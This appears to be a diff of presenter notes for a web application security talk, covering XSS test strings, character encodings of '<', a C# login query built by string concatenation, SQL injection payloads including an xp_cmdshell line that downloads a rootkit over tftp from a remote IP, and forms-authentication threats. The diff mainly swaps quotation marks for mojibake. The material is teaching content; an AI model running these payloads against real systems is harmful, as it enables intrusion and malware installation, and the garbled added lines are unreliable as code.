@@ -1,3 +1,4 @@
+Revision Needed.
 ***Always give the presentation you'd want to attend***
 
 Resources 
@@ -9,12 +10,12 @@ Lack of input validation
 Weak authentication
 Weak access control
 Improper use of cryptography
-<script>alert(‘If you see this, XSS is possible’);</script>
+<script>alert(â€˜If you see this, XSS is possibleâ€™);</script>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 security misconfig - directory listing or server update, 
 Samy worm
 
-Ways you can represent “<“?
+Ways you can represent â€œ<â€œ?
 <
 %3C
 &lt
@@ -90,8 +91,8 @@ string sql = "SELECT * FROM Accounts WHERE AccountNumber = '" + AccountTextBox.T
 SqlCommand qry = new SqlCommand( sql, con );
 con.Open();
 SqlDataReaderrdr = qry.ExecuteReader();
-"SELECT * FROM Accounts WHERE AccountNumber = '" +     12345’-- + "' AND Password = '" + 
-"SELECT * FROM Accounts WHERE AccountNumber = '" +     bob’; xp_cmdshell(‘tftp –I 10.10.10.10 GET    my_rootkit.exe’); -- 
+"SELECT * FROM Accounts WHERE AccountNumber = '" +     12345â€™-- + "' AND Password = '" + 
+"SELECT * FROM Accounts WHERE AccountNumber = '" +     bobâ€™; xp_cmdshell(â€˜tftp â€“I 10.10.10.10 GET    my_rootkit.exeâ€™); -- 
 
 Denial of service 
 
@@ -131,13 +132,13 @@ public static void RegisterGlobalFilters(GlobalFilterCollection filters) {
     filters.Add(new HandleErrorAttribute());
 }
 
-Elevation of privileges. An attacker could elevate privileges within your application by updating the user name or the list of roles contained in the ticket prior to posting it back to the server. An attacker who can upload malicious code to your application can also successfully create and modify the form’s authentication tickets.
+Elevation of privileges. An attacker could elevate privileges within your application by updating the user name or the list of roles contained in the ticket prior to posting it back to the server. An attacker who can upload malicious code to your application can also successfully create and modify the formâ€™s authentication tickets.
 Session hijacking. An attacker could capture another user's authentication ticket and use it to access your application. There are a number of ways that this could happen:
 As a result of a cross-site scripting vulnerability.
 If the transport is not being protected using a security mechanism such as Secure Sockets Layer (SSL).
 If the ticket is stored in the browser cache.
 Session usage after sign-out. Even after the user has logged out of the application and the application has called FormsAuthentication.SignOut, the authentication ticket remains valid until its time-to-live (TTL) expires, so it can be used by an attacker to impersonate another user.
-Eavesdropping. An attacker could look inside a form’s authentication ticket to obtain any sensitive information it contains and use this information to compromise your application.
+Eavesdropping. An attacker could look inside a formâ€™s authentication ticket to obtain any sensitive information it contains and use this information to compromise your application.
 Compromise of the user identity store. An attacker with access to the user identity store may obtain access to user names and passwords, either directly from the data store or by using a SQL injection attack.
 To protect against these threats, you can apply the RequireHttpsAttribute  to the global filters collection in the global.asax file.
 
